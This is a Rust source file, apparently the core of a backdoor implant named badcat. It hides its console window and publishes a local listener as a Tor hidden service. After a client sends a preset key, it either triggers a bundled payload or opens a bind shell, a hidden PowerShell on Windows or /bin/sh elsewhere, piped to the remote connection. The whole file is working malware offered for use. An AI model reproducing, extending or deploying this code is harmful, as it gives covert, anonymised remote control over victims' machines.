// hides console window
#![windows_subsystem = "windows"]

mod config;
mod payload;
mod setting;

use std::{env, fs};
use std::error::Error;
use std::io::{Read, Write};
use std::net::{TcpListener, TcpStream};
use std::path::PathBuf;
use std::process::{Command, Stdio};

use setting::Setting;

use badcat_lib::io;
use tor::Tor;

fn main() -> Result<(), Box<dyn Error>> {
    let setting = Setting::new()?;

    let argument = env::args().nth(1).unwrap_or("".to_owned());

    if argument.eq("--exec-payload") {
        return payload::execute(&setting)
    }

    start_tcp_server(&setting)?;

    Ok(())
}

fn unbundle_torrc(path: &PathBuf, port: u16, setting: &Setting) -> Result<(), Box<dyn Error>> {
    let mut contents = setting.torrc.clone();

    contents = contents.replace("@{DATA_DIR}", setting.tor_dir.to_str().unwrap());

    contents = contents.replace(
        "@{CTRL_COOKIE}",
        setting.tor_dir.join("ctrl.cookie").to_str().unwrap(),
    );

    contents = contents.replace(
        "@{CTRL_SOCKET}",
        setting.tor_dir.join("ctrl.socket").to_str().unwrap(),
    );

    contents = contents.replace("@{SERVICE_ADDR}", &format!("127.0.0.1:{}", port));

    fs::write(&path, &contents)?;

    Ok(())
}

fn start_tor(config: &PathBuf, setting: &Setting) -> Result<Tor, Box<dyn Error>> {
    // Fix directory permission - linux build requires this
    if cfg!(unix) || cfg!(macos) {
        let status = Command::new("chmod")
            .args(["700", setting.tor_dir.to_str().unwrap()])
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .status()?;

        if !status.success() {
            return Result::Err(String::from("problem setting app directory permision").into());
        }
    }

    let tor = Tor::new(config);

    Ok(tor)
}

fn start_tcp_server(setting: &Setting) -> Result<(), Box<dyn Error>> {
    let listener = TcpListener::bind("127.0.0.1:0")?;

    let port = listener.local_addr()?.port();
    println!("listening at: {:?}", port);

    let config = &setting.tor_dir.join("config");
    unbundle_torrc(&config, port, &setting)?;

    let tor = start_tor(&config, &setting)?;

    for stream in listener.incoming() {
        match stream {
            Ok(mut stream) => {
                if let Ok(()) = authenticate(&mut stream, &setting) {
                    if setting.uses_payload {
                        // Triggers the payload to execute
                        if let Err(err) = payload::from_process() {
                            println!("problem creating payload process: {:?}", err);
                        }
                    } else if let Err(error) = bind_shell(stream) {
                        println!("connection error: {:?}", error);
                    }
                }
            }
            Err(error) => return Err(Box::new(error)),
        }
    }

    tor.stop()?;

    Ok(())
}

fn authenticate(stream: &mut TcpStream, setting: &Setting) -> Result<(), Box<dyn Error>> {
    let mut buf = Vec::new();

    // allocate a buffer size of key length
    for _ in 0..setting.key.len() {
        buf.push(0);
    }

    if let Err(err) = stream.read_exact(&mut buf) {
        return Err(err.into());
    }

    let untrusted_key = String::from_utf8_lossy(&buf);

    let equals = untrusted_key.eq(&setting.key);

    let reply = if equals { &[1] } else { &[0] };

    if let Err(err) = stream.write(reply) {
        return Err(err.into());
    }

    if let Err(err) = stream.flush() {
        return Err(err.into());
    }

    if equals {
        Ok(())
    } else {
        Err(String::from("not authenticated").into())
    }
}

fn bind_shell(stream: TcpStream) -> Result<(), Box<dyn Error>> {
    let mut args: Vec<&str> = Vec::new();

    let shell = if cfg!(windows) {
        // used powershell instead of cmd because of hidden console window
        args.extend(["-WindowStyle", "Hidden"]);
        "powershell"
    } else {
        args.push("-i");
        "/bin/sh"
    };

    let proc = Command::new(shell)
        .args(args)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()?;

    let stdin = proc.stdin.unwrap();
    let stdout = proc.stdout.unwrap();
    let stderr = proc.stderr.unwrap();

    let stream_in = stream.try_clone()?;
    let stream_out = stream.try_clone()?;
    let stream_err = stream.try_clone()?;

    let in_thread = io::pipe_io(stream_in, stdin);
    let out_thread = io::pipe_io(stdout, stream_out);
    let err_thread = io::pipe_io(stderr, stream_err);

    in_thread.join().unwrap();
    out_thread.join().unwrap();
    err_thread.join().unwrap();

    Ok(())
}
